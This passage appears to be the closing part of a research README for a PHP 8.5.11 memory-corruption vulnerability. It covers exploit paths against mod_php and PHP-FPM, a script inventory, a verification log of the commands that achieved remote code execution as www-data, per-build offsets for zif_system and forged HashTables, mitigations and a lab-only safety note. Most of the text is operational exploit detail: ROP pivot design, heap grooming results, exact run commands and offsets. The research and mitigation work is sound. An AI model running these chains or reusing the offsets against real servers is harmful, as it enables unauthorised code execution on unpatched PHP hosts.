| FPM in-band table ROP via teardown | build the fake table through the session decode, fire via the teardown | the insert overwrites bucket 0; the same `ldmxcsr` failure. The `zif_system` frame tolerates the write because its opline is unused; the pivot cannot | blocked (this fire point only) |
| FPM data-only ROP pivot (Path C2) | same pivot, fired by the upload-progress `zend_hash_update` old-value destructor on a forged `upload_progress_x` key at bucket 0 | **resolved**: the old-value destructor runs on the clean bucket 0 before the clobbering copy, so the pivot sees an intact buffer. `uid=33`, 7/7, ASLR on, no gdb. See `ROP_PIVOT.md` and Path C2 | **working** |
| FPM script-path pivot | `session_start()` in the script, then `$_SESSION['x'] = 0x0000037F00001F80` | `PHP_RINIT_FUNCTION(basic)` zeroes `BG(unserialize)` before the script; the B allocates a fresh `d`. Only the pre-RINIT upload-progress callback reuses the stale `d` | blocked |
| FPM cookie-off SID | `session.use_cookies=0`, `session.use_trans_sid=1`; use the `SID` output as the leak sink | the SID sink is reachable, but `PS(id)` length is `0x1D010` from the upload-progress write target. The A `pre`/`pad`/`hole`, query padding, and `sess_A` size do not move it; stop the blind sweep | blocked |
| FPM `php_serialize` variant | decode the stale `d` with `session.serialize_handler=php_serialize` | the decoder unserializes the whole record and assigns it to `PS(http_session_vars)`; it does not call `php_set_session_var` and has no per-value `tmp_var`. No `SET#`; the `v5` stays normal | blocked |
| FPM `php_binary` variant | use the per-value `tmp_var` ring of `php_binary` | the ring fires and the stale `d` is reused, but the first decode target is `0x1F030` above the `v5` length and the second is `0x1CFA0` below. `pad`, `hole`, `vlen`, and the `sess_A` size did not close the gap | blocked |
| FPM 8.4.26 | calibrate the same chain on `php:8.4.26-fpm` | the A `d - last_dtor` delta is `0x17B000` vs `0x132000` on 8.5.11; the target/`v5` gap is `0x11FF0`; `pre`/`pad`/`hole`/`vlen` sweeps did not close it. Not completed | blocked |
| FastCGI `PHP_VALUE` | attacker-supplied `PHP_VALUE`/`PHP_ADMIN_VALUE` params | a startup crash/abort, conditional on direct FastCGI access or a permissive proxy; no code execution. `fpm/fcgi_ini.py`, `fpm/probe-bt.gdb` | no RCE |
| bare FPM endpoint | expect the native chain on `<?php echo "OK\n";` | the native chain needs the app-visible leak and the session/decode OOM; a virgin endpoint has neither. The native impact is an unauthenticated worker crash | no RCE |
| handler mismatch / LFI | `chain_c.py`, `chain_a.py` | application/config conditions; `chain_c` still works on 8.5.12; the LFI exists independently. Excluded from the php2shell risk verdict | excluded |
| 9bie 8.4.26 PoC | run the public full-chain PoC on `php:8.4.26-apache` | 0/10 attempts in this lab (alternating empty and no-pointer leaks); the 10/10 stock claim did not reproduce here | not reproduced |
| 8.5.12 controls | same chains against the fixed releases | on-chain B1 no forged cookie; FPM leak fails; the pre-RINIT aux decode keeps objects incomplete. The off-chain fixed control was not re-tested in this pass | fixed |

### FPM worker crash (no RCE)

`fpm/run_fpm_repro.sh` is the minimal stale-unserializer reproducer: S1 is a
1.19 MB serialized session, S2 is one integer; A runs `session_start()` on S1
under `memory_limit=4M` and OOMs inside the decode; B is an upload-progress
request whose 4096-byte file-part names reclaim the freed
`php_unserialize_data`; the next session decode dereferences the clobbered
pointers in `var_tmp_var()` and the worker dies with SIGSEGV.

```bash
RESTART=1 CONTAINER=p2s-fpm ./fpm/run_fpm_repro.sh 9001
```

Expected on 8.5.11: `A http=500`, the B response is 502, and the container log
gains a `signal-11` entry. On 8.5.12: A returns 200 and the signal-11 count does
not move. This is the control for Path C: the same stale `d` is reused, but
without the leak and the controlled write target the impact is a worker crash,
not code execution.

### path1 failure detail

`path1_hash/path1_body.py` defaults and the `--big-fake`, `--big-addr`,
`--file-groom`, `--marker` options document the attempts. The measured facts:

- The partial-bucket OOM is real: `_zend_hash_str_add_or_update_i()` increments
  the counts, then the final key allocation fails; the request returns 500.
- The first `zend_array_destroy` with `nNumUsed == 1` is the `$_FILES['X']`
  table. `arData = 0x7ffff685d400`, `blk = arData - 0x40 = 0x7ffff685d3c0`.
- The `blk` block is `0xFF...` (the chunk header), not the groom. The `ad`
  bucket is the caller bucket (`val.ptr = 0x7ffff685b118`, type `0x307`). The
  stale bucket at `ad+0x10` is a recycled table bucket, not user data.
- The 280-byte groom is bin 320; the arData is a recycled HashTable, so the
  groom values (which stay alive in `$_POST`) never re-enter the allocator to
  be reused by the arData. The 288-byte groom does not change that.
- The E0-style partial-bucket variant (`b0000` fake table + 288-byte file-part
  value) also fails: the `files` array reuses the old `$_POST` arData, whose
  bucket 0 is the first `_POST` field (`0x40200258`, IS_STRING), not the file
  part. A gdb log of all 73,418 destroys contains no bucket 0 equal to
  `big`; the `0x40200258` IS_STRING value appears 1,089 times.
The missing piece is a userland write to the real `$_FILES['X']` HashTable's
`pDestructor` (`ht+0x30`), or to the chunk header at `blk`. The session E0
`var_tmp_var()` write is the only arbitrary write in this project; path1 has
no equivalent. The gdb pivot writes both the fake block and the `zif_system`
address, which is why it works.

Earlier path1 tuning (all in `path1_hash/README.md`): 231-byte values (bin 256)
plus 20 extra keys moved the OOM to `zend_hash_do_resize` (the table stayed
valid; the worker survived); the nested `files[L...][a]` body OOMs in
`php_register_variable_safe` (the key is allocated before the hash insert, so
no partial bucket is made); `--cttail=0` moved the OOM to `_estrdup` (the
long-segment header) before the key. `zend_hash_real_init_mixed` and
`zend_hash_do_resize` leave no partial bucket; only the key allocation inside
`zend_hash_str_update_ind`, after `nNumUsed++`, does. The A1-shaped body is the
trigger; the grooms did not land.

### FPM leak detail

`FPM_RCE.md` section 8 lists what a stock application must supply: a
decode-time longjmp bailout (a low `memory_limit`, a session file larger than
the limit, `exit()`, a fatal error, or a timeout in a magic method), attacker-
controlled session data, a controllable allocation before `session_start()`,
and an address leak. A virgin default install with no session injection and no
bailout path is not exploitable by this chain. The native chain in Path C uses
the lab's two-page app for the leak; the worker-crash result on a bare endpoint
is the honest clean-target impact.

### Fixed controls

`php:8.5.12-apache` and `php:8.5.12-fpm` are the controls for every chain. The
fix commit `31c0ea7d7ff` changes `Zend/zend_alloc.c`,
`Zend/zend_execute_API.c`, `Zend/zend_hash.c`, `Zend/zend_vm_def.h`,
`main/php_variables.c`, `main/rfc1867.c`, `main/SAPI.c`, `main/main.c`, and
`ext/session/session.c`. The 8.5.12 FPM image fails at the leak stage; the
pre-RINIT session-object decode keeps objects as `__PHP_Incomplete_Class`.

---

## Script inventory

| Script | Role |
|---|---|
| `chain.php` | Path A full trigger: A1/B1/A2/B2, leak parsing, fake HashTable. |
| `lab/php.ini` | Path A ini (`display_errors=On`, `output_buffering=0`, 128M). |
| `lab/httpd.conf` | Path A single-process Apache on 8089. |
| `lab/php-off.ini` | Byte-identical stock `php.ini-production` for Path B. |
| `lab/httpd-off.conf` | Path B single-process Apache on 8091. |
| `lab/httpd-10ka.conf` | Path B 10-child prefork, stock KeepAlive. |
| `off_chain/run_off_chain.sh` | Path B orchestrator (A1/B1/A2/B2 + proof). |
| `off_chain/run_off_chain_pinned.sh` | Path B pinned multi-child runner. |
| `off_chain/mk_a1_off.py` | A1 body generator. |
| `off_chain/chunked_send.py` | Chunked sender (bypasses `post_max_size`). |
| `off_chain/off_b1b.php` | B1 body: forged `zend_string` leak. |
| `off_chain/parse_leak.php` | Set-Cookie -> `main`/`libphp`. |
| `off_chain/cheap_oom_a.py` | A2 cheap-OOM body. |
| `off_chain/stage3_off.php` | B2 fake reference + fake HashTable (`zif_system`). |
| `off_chain/stage3_rop.php` | B2 pivot + `popen` ROP variant. |
| `off_chain/pin_workers.py` | Holds `MaxRequestWorkers-1` children. |
| `off_chain/keepalive_relay.py` | Research relay; not part of the chain. |
| `fpm/run_native.sh` | Path C leak + exploit pairs, fill rebuild, proof. |
| `fpm/mk_native_fill.py` | Rebuilds the fill for a leaked `d`; `--e0`, `--nogdb`, `--heap`. |
| `fpm/run_rop_pivot.sh` | Path C2 data-only ROP pivot chain (isolated FPM + nginx). |
| `fpm/mk_rop_pivot.py` | Overlays the pivot buffer + forged progress-key lookup onto the Round 37 nogdb fill. |
| `fpm/fcgi_split.py` | FastCGI split sender; `PROG`, `SID_GET`. |
| `fpm/pin_fcgi.py` | Pins FPM workers with truncated FastCGI records. |
| `fpm/zz-single.conf` | One FPM worker. |
| `fpm/zz-multi.conf` | Four-worker FPM pool. |
| `fpm/nginx-8511.conf` | nginx upstream `p2s-fpm-8511:9000` (9002). |
| `fpm/run_rce_fpm.sh` | Path D type-confusion chain; `MODE=nogdb|gdb`. |
| `fpm/run_fpm_repro.sh` | FPM worker-crash reproducer (stale unserialize). |
| `fpm/probe-ht.gdb` | Probe-assisted oracle for the session HT/frame. |
| `fpm/probe-noframe.gdb` | Logs the `zif_system` frame without writing it. |
| `fpm/php-preload.ini` | Production ini + `opcache.preload` for Path F. |
| `fpm/chain_e2.py` | Path F2 handler-mismatch + pre-RINIT wakeup. |
| `fpm/chain_e3.py` | Path F3 Laravel PendingBroadcast payload. |
| `fpm/chain_c.py` | Post-RINIT handler-mismatch app chain (excluded). |
| `fpm/chain_a.py` | Upload-progress value + LFI (excluded). |
| `www/preload.php` | Preloaded `Evil` + framework classes (Path F). |
| `www/preload_store.php` | Stores an `Evil` object for Path F1. |
| `www/mk_laravel_payload.php` | Builds the Laravel serialized object. |
| `www/index.php` | Empty target page (`echo "OK\n";`). |
| `path1_hash/path1_body.py` | Path E multipart body; `--big-fake`, `--file-groom`, `--marker`. |
| `path1_hash/run_path1.sh` | Sends the path1 body to the gdb target. |
| `path1_rce/probe-pivot.gdb` | Gdb pivot: fake HashTable, `zif_system`, proof. |
| `path2_autostart/README.md` | Path 2 auto_start record (blocked). |
| `progress.md` | Full research log, including every failed sweep. |

## Verification log (independent clean-image re-validation, 2026-10-28)

Every path below was re-run from freshly pulled official images (`php:8.5.11`
multi-arch digests `47e6d884…` apache / `36b66e02…` fpm, `nginx:alpine`),
independent of any prior lab container state, to confirm the results rather than
inherit them.

| Path | Arch | Command | Result |
|---|---|---|---|
| A | x86-64 | `php -d memory_limit=-1 chain.php 8089 'id>/out/p1_reval'` | `uid=33(www-data)`; `zif=libphp+0x5996e0` |
| B | x86-64 | `CONTAINER=p2s-8511-off ./off_chain/run_off_chain.sh 8091 /tmp/off_proof` | `RCE OK`; `uid=33(www-data)`; live date |
| B2 (ROP) | x86-64 | `STAGE3=stage3_rop.php CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/rop_proof` | `RCE OK`; `uid=33(www-data)`; live date |
| C | x86-64 | `MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb bash fpm/run_native.sh` | `[proof] uid=33(www-data)` |
| C2 (data-only ROP) | x86-64 | `bash fpm/run_rop_pivot.sh` | `/tmp/fpm_rop_proof` = `uid=33(www-data)`, **7/7**, ASLR on, no gdb |
| D | x86-64 | `MODE=nogdb bash fpm/run_rce_fpm.sh` | **FAIL**: worker SIGSEGV, no proof (see Path D caveat; fill reclaims `d`) |
| E | x86-64 | `bash path1_hash/run_path1.sh 8093 /tmp/p1.bin` (setarch -R gdb target) | `/tmp/p1hash` = `uid=33(www-data)` |
| Barm | aarch64 | `CONTAINER=p2s-8511-off ./off_chain/run_off_chain_arm.sh 8091 /tmp/off_proof` | `uid=33(www-data)`, **4/5** fresh-worker runs across randomized ASLR bases |
| Carm | aarch64 | `MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb bash fpm/run_native_arm.sh` | `[proof] uid=33(www-data)`, **3/3** |

A/B/B2/C/C2/E reproduce cleanly on x86-64; Path B ports to aarch64 (Path B's small-
bin spray and the B1 leak are architecture-portable, see `PORTING.md`). Path D
does not reproduce as shipped (fixed-address FPM groom is build-specific). The
aarch64 miss (1/5) is `parse_leak_arm.php` failing to locate a cluster, a leak-
heuristic fragility, not an exploit failure; a re-run succeeds.

The `out/` directory must be writable by the web user (`chmod 777 out`); the
first on-chain run prints `done` with an empty `out/p1` otherwise. The FPM runs
need host port 9003 free.

## Offsets and builds

All offsets are for the official `php:8.5.11` images, Debian trixie, NTS.
They change with the build; derive them with the probes before using another
image. The x86-64 -> aarch64 port and the re-derivation procedure are in
`PORTING.md`.

| Build | Symbol/object | Value |
|---|---|---|
| mod_php 8.5.11 x86-64 | `zval_ptr_dtor` | `libphp + 0x7b47a0` |
| mod_php 8.5.11 x86-64 | `zif_system` | `libphp + 0x5996e0` |
| mod_php 8.5.11 x86-64 | `PS(id)` after A1 | `main + 0xa7000` |
| mod_php 8.5.11 x86-64 | stale reference after A2 | `main + 0x7a720` |
| mod_php 8.5.11 x86-64 | fake HashTable (On) | `main + 0xF5398` |
| mod_php 8.5.11 x86-64 | fake HashTable (Off) | `main + 0xF7398` |
| mod_php 8.5.11 x86-64 | path1 `arData - chunk` | `0x5d7c0` |
| mod_php 8.5.11 **aarch64** | `zval_ptr_dtor` | `libphp + 0x761b80` (leak low12 `0xb80`) |
| mod_php 8.5.11 **aarch64** | `zif_system` | `libphp + 0x5314f0` |
| mod_php 8.5.11 **aarch64** | fake HashTable (Off) | `main + 0xF7398` (unchanged) |
| mod_php 8.5.11 **aarch64** | `BG(unserialize).data` / `.level` | `bg + 0x348` / `bg + 0x350` (x86: `+0x368`/`+0x370`) |
| mod_php/FPM 8.5.11 both | `EG(function_table)` ptr | `EG + 0x7f8` |
| FPM 8.5.11 x86-64 | `zif_system` | `PIE + 0x60e3a0` |
| FPM 8.5.11 x86-64 | PIE base | leaked pointer − `0x7c9777` |
| FPM 8.5.11 x86-64 | `d` | leaked heap + `0x15cbd8` (+ `0x37000` after a leak pair) |
| FPM 8.5.11 x86-64 | session HT | `d - 0x193CF0` (leak layout) |
| FPM 8.5.11 x86-64 | fake table/frame | `d + 0xE80` |

## Mitigation

- Upgrade to PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35. This removes the bailout
  state corruption and the pre-RINIT decode reuse.
- If upgrading is not possible: `session.upload_progress.enabled=0` removes the
  pre-RINIT session consumer for the FPM/mod_php session chains. It does not fix
  the underlying memory bug and does not address path1.
- `memory_limit=-1` removes the OOM trigger, but is not a primary control.
- Restart every Apache/FPM worker after changing the configuration; the stale
  state lives in worker memory.
- `display_errors=Off` is not a mitigation for the session chain; it only
  removes the A1 warning used by the On variant.
- Do not expose FPM directly; the FastCGI `PHP_VALUE`/`PHP_ADMIN_VALUE` params
  are a separate hardening issue.

## Safety

Lab only. The vulnerable images are PHP 8.5.11; the fixed controls are 8.5.12.
The auxiliary FPM chains require application code or a configuration mismatch
and are not counted as php2shell RCEs. No external posting, no php-src PR, and
no GHSA without explicit approval for that exact action.
